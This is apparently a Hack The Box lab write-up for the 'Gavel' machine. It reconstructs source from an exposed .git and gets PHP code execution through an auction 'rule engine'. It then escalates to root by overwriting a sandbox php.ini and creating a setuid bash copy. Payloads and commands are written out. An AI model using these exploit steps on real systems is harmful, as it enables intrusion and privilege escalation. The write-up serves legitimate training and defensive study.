# Gavel — Hack The Box, Medium, Linux

**TL;DR:** An exposed `.git` hands over the source of a fantasy auction site
whose "rule engine" runs a per-auction PHP string on every bid. The privileged
`auctioneer` account (recovered by online guessing) can write that rule → RCE as
`www-data`; its password is reused as the UNIX password → `user`. `auctioneer`
is in `gavel-seller`, the only group allowed to talk to a root daemon that
"safely" validates a submitted rule by running it as root under a PHP sandbox —
whose config file it can overwrite, because that file lives inside the sandbox's
own `open_basedir`. Rewrite the sandbox, `system()` as root.

*Flags redacted. Machine address generalised to `10.129.x.x`.*

---

## Reconnaissance

Two ports, which immediately raises the value of each:

    nmap -Pn -p- 10.129.x.x        # 22, 80 only
    nmap -sCV -p22,80 ...
    22/tcp OpenSSH 8.9p1 (Ubuntu jammy)
    80/tcp Apache 2.4.52 — "Did not follow redirect to http://gavel.htb/"

The redirect to a hostname is the direction-setter: add `gavel.htb` to hosts.
The site is "Gavel Auction 2.0", a custom PHP app with open registration and a
self-described "over-engineered Rule Engine". No extra vhosts (20k list).

## Enumeration

Registering an account exposes an authenticated area — `bidding.php` (bids POST
to `includes/bid_handler.php`, returning JSON) and `inventory.php`. Content
discovery finds `admin.php` (302→index for a normal user) and, decisively, a
readable **`.git/HEAD`** in the web root:

    git-dumper http://gavel.htb/.git/ gavel-src

That reconstructs the whole application. Reading it is the engagement. Two files
matter:

`includes/bid_handler.php` — the "rule engine":

```php
runkit_function_add('ruleCheck', '$current_bid,$previous_bid,$bidder', $rule);
$allowed = ruleCheck($current_bid, $previous_bid, $bidder);
```

`$rule` is the `auctions.rule` column, executed verbatim as PHP on every bid.
`admin.php` is the only writer of that column, gated on `$_SESSION['user']['role']
=== 'auctioneer'`. So the sink is real but needs the `auctioneer` role.

Registration refuses duplicate usernames ("Username already taken"), a free
existence oracle — and it confirms a pre-seeded `auctioneer`. Login has no
lockout and no rate limit, so an online attack is fair game. A wordlist run
lands it:

    auctioneer : midnight1

## Foothold — arbitrary PHP as www-data

Logged in as `auctioneer`, `admin.php` lets me set any auction's rule. The rule
body becomes the function body, so it can be arbitrary PHP:

    POST /admin.php   auction_id=<id>&rule=return system("id");&message=x

Then place a valid bid on that auction (must exceed the current price and be
covered by the account's balance). `bid_handler` runs the rule and returns its
output inline:

    {"...":"..."}  uid=33(www-data) gid=33(www-data) groups=33(www-data)

A synchronous, egress-free RCE oracle — no listener required. I wrapped it in a
small client that sets the rule as `auctioneer`, then bids from a throwaway
funded account and reads the reflected output.

## Lateral movement — password reuse

`www-data` cannot enter `/home/auctioneer` (750). But the web password is reused
as the UNIX password. SSH refuses `auctioneer` (public-key and password both
rejected — the account is restricted at sshd), yet PAM via `su` accepts it:

    www-data$ su auctioneer      # midnight1
    auctioneer$ cat ~/user.txt
    <redacted>

## Privilege escalation — a root daemon that runs your code "safely"

`ps`/systemd show three custom root services: `gaveld`, `auction_watcher.sh`,
and `timeout_gavel.py` ("Apache bid_handler killer" — which is what kept killing
my long-running RCE commands). `gaveld` listens on a UNIX socket
`/run/gaveld.sock` owned `root:gavel-seller`, mode `0660` — and `auctioneer` is
the sole member of `gavel-seller`. The client is `/usr/local/bin/gavel-util`
(`submit <file>` / `stats` / `invoice`).

Pulling the binary, its strings tell the whole story:

    /opt/gavel/.config/php/php.ini
    /usr/bin/php
    function __sandbox_eval(){$previous_bid=%ld;$current_bid=%ld;$bidder='%s';%s};
      $res=__sandbox_eval();if(!is_bool($res)){echo 'SANDBOX_RETURN_ERROR';}
      else if($res){echo 'ILLEGAL_RULE';}

So `gaveld` "validates" a submitted item's `rule` by executing it — **as root**,
via `/usr/bin/php -c /opt/gavel/.config/php/php.ini` — and returns PHP output to
the client. That output is an oracle. Submitting a rule that throws reveals the
sandbox:

    uid=0 | open_basedir=/opt/gavel | ffi=0 | putenv=1 | mail=1 | file_put_contents=allowed

`disable_functions` blocks the exec family; `open_basedir=/opt/gavel` and no FFI.
`ini_restore('open_basedir')` does not clear it. The break is quieter: the
sandbox's own `php.ini` is **root-owned and sits inside `open_basedir`**, and
`file_put_contents`/`copy` are not disabled. So the root PHP process can rewrite
the file that defines its own restrictions.

Submission 1 — back it up, then relax it:

```php
$p='/opt/gavel/.config/php/php.ini';
if(!file_exists($p.'.bak')) copy($p,$p.'.bak');
file_put_contents($p,"engine=On\ndisable_functions=\nmax_execution_time=10\n");
return false;
```

Submission 2 — now `system()` is enabled, and runs as root:

```php
system('cat /root/root.txt > /dev/shm/rr; cp /bin/bash /opt/gavel/.rb; chmod 6777 /opt/gavel/.rb');
return false;
```

```
auctioneer$ /opt/gavel/.rb -p -c 'id; cat /root/root.txt'
uid=1001(auctioneer) euid=0(root) ...
<redacted>
```

Root.

## What did not work

- **`inventory.php` `sort`/`user_id`.** `sort` reaches `SELECT $col …` but is
  backtick-wrapped with backticks stripped — column choice only, no SQLi. The
  `user_id` IDOR only exposes the inventory table. Both DEAD.
- **`bid_amount` injection.** Cast to `int` (`(int)$_POST['bid_amount']`) — no
  string ever reaches SQL or the rule. DEAD.
- **`ini_restore('open_basedir')` inside the root sandbox.** The master value is
  also `/opt/gavel`, so it doesn't lift the restriction — the writable-config
  angle was the way through, not the classic ini bypass.
- **SSH as auctioneer.** Correct password, but sshd rejects the account (both
  key and password). `su` was the pivot; don't read the SSH refusal as a wrong
  credential.

## Lessons

- A readable `.git` turns black-box into white-box; dump it before any fuzzing.
- "It's sandboxed" is not "it's safe" when the sandbox reads its policy from a
  file the sandboxed code can write. Any `open_basedir` that *contains* the
  `php.ini` (or an `EnvironmentFile`, or the disable-list source) is
  self-defeating. And a sandbox missing the file-write family
  (`file_put_contents`, `copy`, `putenv`, `mail`) is only half a sandbox.
- The same dangerous pattern often appears twice on a box at different privilege
  levels (here: a code-string "rule engine" as `www-data`, then again as root).
  Recognising the class the first time predicts the second.

## Defensive takeaway

Delete the code-string rule engine and replace it with a declarative,
non-executable constraint format. It is the single flaw that appears twice — as
the foothold and as the root step — and either instance is total compromise on
its own. Fixing the `.git` exposure or the weak `auctioneer` password only slows
discovery; the engines are exploitable regardless once the role is reached.
